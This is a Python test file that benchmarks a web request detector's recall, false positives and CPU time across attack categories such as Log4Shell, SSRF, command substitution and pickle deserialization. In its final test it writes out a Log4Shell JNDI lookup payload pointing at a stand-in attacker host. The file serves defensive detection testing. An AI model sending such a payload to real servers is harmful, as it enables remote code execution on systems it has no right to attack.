    mechanisms_exercised: set[str] = set()
    malicious_detected = 0
    undetected_case_ids: list[str] = []
    detected_by_mechanism: dict[str, int] = {}
    total_by_mechanism: dict[str, int] = {}
    benign_flagged = 0
    known_false_positive_case_ids: list[str] = []
    unexpected_false_positive_case_ids: list[str] = []
    with caplog.at_level(logging.WARNING, logger="guard_core"):
        for case in _PRODUCTION_MALICIOUS_CASES:
            mechanism = _mechanism_for_case_id(
                _valid_mechanisms_for_category(case.category), case.case_id
            )
            mechanisms_exercised.add(mechanism)
            total_by_mechanism[mechanism] = total_by_mechanism.get(mechanism, 0) + 1
            if _detected_via(mechanism, case.payload):
                malicious_detected += 1
                detected_by_mechanism[mechanism] = (
                    detected_by_mechanism.get(mechanism, 0) + 1
                )
            else:
                undetected_case_ids.append(f"{case.case_id}[{mechanism}]")

        for benign_case in _PRODUCTION_BENIGN_CASES:
            mechanism = _mechanism_for_case_id(_ALL_MECHANISMS, benign_case.case_id)
            mechanisms_exercised.add(mechanism)
            if _detected_via(mechanism, benign_case.payload, True):
                benign_flagged += 1
                pin_key = f"{benign_case.case_id}[{mechanism}]"
                if pin_key in _KNOWN_E2E_FALSE_POSITIVES:
                    known_false_positive_case_ids.append(pin_key)
                else:
                    unexpected_false_positive_case_ids.append(pin_key)

    assert "detection_max_scan_values" not in caplog.text, (
        "the standard malicious/benign corpora tripped the scan-value cap; "
        "this must never happen at the default 512 cap -- either a corpus "
        "case grew an unexpectedly wide payload or the cap default needs "
        "reconsidering, not silently accepting a newly-capped corpus case"
    )

    targeted_failures: list[str] = []
    for targeted in _TARGETED_CASES:
        result = detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            targeted_failures.append(targeted.case_id)

    backtick_targeted_failures: list[str] = []
    for targeted in _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES:
        result = detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            backtick_targeted_failures.append(targeted.case_id)

    round6_targeted_failures: list[str] = []
    for targeted in _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES:
        result = detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            round6_targeted_failures.append(targeted.case_id)

    dollar_fp_and_log4shell_bonus_failures: list[str] = []
    for targeted in _DOLLAR_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES:
        result = detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            dollar_fp_and_log4shell_bonus_failures.append(targeted.case_id)

    ssrf_ipv4_mapped_and_trailing_dot_failures: list[str] = []
    for targeted in _SSRF_IPV4_MAPPED_AND_TRAILING_DOT_TARGETED_CASES:
        result = detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            ssrf_ipv4_mapped_and_trailing_dot_failures.append(targeted.case_id)

    json_depth_failures: list[str] = []
    for targeted in _JSON_DEPTH_TARGETED_CASES:
        result = detect_penetration_attempt(targeted.request, _CONFIG)
        if result.is_threat != targeted.expect_detected:
            json_depth_failures.append(targeted.case_id)

    wall_time_seconds = time.monotonic() - start

    report_lines = [
        "END-TO-END DETECTION BENCHMARK REPORT (detect_penetration_attempt)",
        f"malicious corpus: {len(_PRODUCTION_MALICIOUS_CASES)} cases "
        f"({len(MALICIOUS_CORPUS) - len(_PRODUCTION_MALICIOUS_CASES)} "
        "encoding-only cases excluded: those target the isolated "
        "encoding-aware manager, not the shared production singleton)",
        f"benign corpus: {len(_PRODUCTION_BENIGN_CASES)} cases",
        f"mechanisms exercised: {sorted(mechanisms_exercised)}",
        f"wall time: {wall_time_seconds:.3f}s",
        "",
        "recall by delivery mechanism (detected/total):",
    ]
    for mechanism in _ALL_MECHANISMS:
        total = total_by_mechanism.get(mechanism, 0)
        if total:
            report_lines.append(
                f"  {mechanism:16} "
                f"{_fraction(detected_by_mechanism.get(mechanism, 0), total)}"
            )
    report_lines.extend(
        [
            "",
            f"total recall:  "
            f"{_fraction(malicious_detected, len(_PRODUCTION_MALICIOUS_CASES))}",
            f"total fp rate: "
            f"{_fraction(benign_flagged, len(_PRODUCTION_BENIGN_CASES))}",
            "",
            "targeted entry-level cases:",
        ]
    )
    for targeted in _TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected} "
            f"gap={targeted.known_gap_reason or 'none'}"
        )
    report_lines.append("")
    report_lines.append(
        "targeted backtick sql-keyword-exemption-bypass cases (defect 5):"
    )
    for targeted in _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected}"
        )
    report_lines.append("")
    report_lines.append(
        "targeted round-6 command-substitution cases "
        "(dollar-paren/brace, log4shell, sql-keyword-glue):"
    )
    for targeted in _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected}"
        )
    report_lines.append("")
    report_lines.append(
        "targeted dollar-substitution disclosed-FP and log4shell "
        "url_path bonus cases (ruling items 1-2):"
    )
    for targeted in _DOLLAR_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected}"
        )
    report_lines.append("")
    report_lines.append(
        "targeted ssrf ipv4-mapped-ipv6-loopback and trailing-dot-localhost cases:"
    )
    for targeted in _SSRF_IPV4_MAPPED_AND_TRAILING_DOT_TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected}"
        )
    report_lines.append("")
    report_lines.append(
        "targeted nested-json depth cases (GHSA-f6cf-jjhc-qp85, depth 10 and 40):"
    )
    for targeted in _JSON_DEPTH_TARGETED_CASES:
        report_lines.append(
            f"  {targeted.case_id}: expected={targeted.expect_detected}"
        )
    report_lines.append("")
    report_lines.append("known end-to-end false positives (documented, still counted):")
    for pin_key, reason in _KNOWN_E2E_FALSE_POSITIVES.items():
        report_lines.append(f"  {pin_key}: {reason}")
    report = "\n".join(report_lines)
    print(report)

    assert not targeted_failures, f"{targeted_failures}\n{report}"
    assert not backtick_targeted_failures, f"{backtick_targeted_failures}\n{report}"
    assert not round6_targeted_failures, f"{round6_targeted_failures}\n{report}"
    assert not dollar_fp_and_log4shell_bonus_failures, (
        f"{dollar_fp_and_log4shell_bonus_failures}\n{report}"
    )
    assert not ssrf_ipv4_mapped_and_trailing_dot_failures, (
        f"{ssrf_ipv4_mapped_and_trailing_dot_failures}\n{report}"
    )
    assert not json_depth_failures, f"{json_depth_failures}\n{report}"

    assert malicious_detected >= BASELINE_MALICIOUS_DETECTED_TOTAL, (
        f"overall recall regressed: baseline={BASELINE_MALICIOUS_DETECTED_TOTAL} "
        f"actual={malicious_detected} newly_undetected={undetected_case_ids}\n"
        f"{report}"
    )
    assert not unexpected_false_positive_case_ids, (
        f"unexpected false positives: {unexpected_false_positive_case_ids}\n{report}"
    )
    assert benign_flagged <= len(_KNOWN_E2E_FALSE_POSITIVES), (
        f"more benign cases flagged than documented known false positives: "
        f"actual={benign_flagged} known={known_false_positive_case_ids}\n{report}"
    )


@pytest.mark.redos_timing
def test_detect_penetration_attempt_cpu_time_ceiling_uncovered() -> None:
    node_id = (
        f"{__file__}::test_detect_penetration_attempt_recall_and_false_positive_rate"
    )

    result = subprocess.run(
        [sys.executable, "-c", _CHILD_CPU_TIME_SCRIPT, node_id],
        capture_output=True,
        text=True,
        timeout=180,
    )

    assert result.returncode == 0, (
        f"uncovered benchmark subprocess failed:\n{result.stdout}\n{result.stderr}"
    )

    match = _CPU_TIME_REPORT_PATTERN.search(result.stdout)
    assert match, f"could not find cpu time in subprocess output:\n{result.stdout}"
    cpu_time_seconds = float(match.group(1))

    host_factor = _host_cpu_speed_factor()
    ceiling_seconds = _UNCOVERED_CPU_TIME_CEILING_SECONDS * host_factor
    print(f"host cpu speed factor: {host_factor:.3f}")

    assert cpu_time_seconds < ceiling_seconds, (
        "end-to-end detection benchmark uncovered CPU time regressed: measured "
        "via time.process_time() inside the child pytest subprocess around a "
        "single run, not the parent's wall clock, so host contention cannot "
        "produce a false failure the way wall-clock timing did before. The "
        "statistics.mean/stdev exact-Fraction PerformanceMonitor tax "
        "(monitor_anomalies.py) was replaced with float math.fsum arithmetic, "
        "cutting this benchmark from ~53.7s to ~19.8s CPU measured on the "
        "reference tree. The ceiling is host-calibrated: "
        f"{_UNCOVERED_CPU_TIME_CEILING_SECONDS}s base (roughly 2x that ~19.8s "
        "post-fix measurement) scaled by _host_cpu_speed_factor(), which "
        "times a fixed pure-Python workload against this host's own "
        "reference measurement so a revert to the old exact-Fraction "
        "implementation fails on slower CI hosts too, not just this machine. "
        f"host_factor={host_factor:.3f} "
        f"ceiling={ceiling_seconds:.3f}s "
        f"actual={cpu_time_seconds:.3f}s"
    )


def test_detect_penetration_attempt_legacy_smoke() -> None:
    original_detection_state = sus_patterns_handler._detection_state
    _reset_singleton_to_legacy()

    try:
        malicious_detected = 0
        for case in _PRODUCTION_MALICIOUS_CASES:
            mechanism = _mechanism_for_case_id(
                _valid_mechanisms_for_category(case.category), case.case_id
            )
            if _detected_via(mechanism, case.payload):
                malicious_detected += 1

        benign_flagged = 0
        for benign_case in _PRODUCTION_BENIGN_CASES:
            mechanism = _mechanism_for_case_id(_ALL_MECHANISMS, benign_case.case_id)
            if _detected_via(mechanism, benign_case.payload, True):
                benign_flagged += 1

        assert malicious_detected >= _LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL, (
            f"legacy singleton recall regressed: "
            f"baseline={_LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL} "
            f"actual={malicious_detected}"
        )
        assert benign_flagged <= len(_KNOWN_E2E_FALSE_POSITIVES), (
            f"legacy singleton false-positive rate rose: "
            f"baseline={len(_KNOWN_E2E_FALSE_POSITIVES)} actual={benign_flagged}"
        )
    finally:
        sus_patterns_handler._detection_state = original_detection_state


def test_mechanism_for_case_id_canary_sentinels_stay_fixed() -> None:
    assert (
        _mechanism_for_case_id(_ALL_MECHANISMS, "sentinel_case_alpha")
        == "multipart_body"
    )
    assert _mechanism_for_case_id(_ALL_MECHANISMS, "sentinel_case_delta") == "url_path"
    assert (
        _mechanism_for_case_id(_ALL_MECHANISMS, "sentinel_case_epsilon")
        == "json_body_nested"
    )


def test_mechanism_assignment_unchanged_by_corpus_append() -> None:
    case_ids = [case.case_id for case in _PRODUCTION_BENIGN_CASES[:10]]
    before = {
        case_id: _mechanism_for_case_id(_ALL_MECHANISMS, case_id)
        for case_id in case_ids
    }

    grown_case_ids = [*case_ids, "newly_appended_dummy_corpus_case"]
    after = {
        case_id: _mechanism_for_case_id(_ALL_MECHANISMS, case_id)
        for case_id in grown_case_ids
        if case_id in before
    }

    assert before == after


def test_known_e2e_false_positive_pins_are_all_non_vacuous() -> None:
    payload_by_case_id = {
        case.case_id: case.payload for case in _PRODUCTION_BENIGN_CASES
    }

    for case_id, (_, mechanism) in _KNOWN_E2E_FALSE_POSITIVE_SOURCES.items():
        derived_mechanism = _mechanism_for_case_id(_ALL_MECHANISMS, case_id)
        assert derived_mechanism == mechanism, (
            f"{case_id}: pinned mechanism {mechanism!r} no longer matches the "
            f"case-id-derived mechanism {derived_mechanism!r}"
        )
        assert _detected_via(mechanism, payload_by_case_id[case_id], True), (
            f"{case_id}[{mechanism}]: pin is vacuous, this mechanism does not "
            "flag the payload"
        )


_BYTE_SENSITIVE_DESERIALIZATION_CASE_IDS = frozenset(
    {
        "deserialization_pickle_global_opcode_proto_header_prefixed",
        "deserialization_pickle_global_opcode_newtrue_prefixed",
    }
)


def test_byte_sensitive_deserialization_detected_via_every_mechanism() -> None:
    byte_sensitive_cases = [
        case
        for case in MALICIOUS_CORPUS
        if case.case_id in _BYTE_SENSITIVE_DESERIALIZATION_CASE_IDS
    ]
    assert {
        case.case_id for case in byte_sensitive_cases
    } == _BYTE_SENSITIVE_DESERIALIZATION_CASE_IDS

    failures = [
        f"{case.case_id}[{mechanism}]"
        for case in byte_sensitive_cases
        for mechanism in _BODY_MECHANISMS
        if not _detected_via(mechanism, case.payload)
    ]
    assert not failures, failures


def test_always_scan_header_shield_honors_disabled_cmd_injection_category() -> None:
    disabled_config = SecurityConfig(enabled_detection_categories={"xss"})
    request = _user_agent_header_request("${jndi:ldap://evil.example/a}")

    result = detect_penetration_attempt(request, disabled_config)

    assert result.is_threat is False
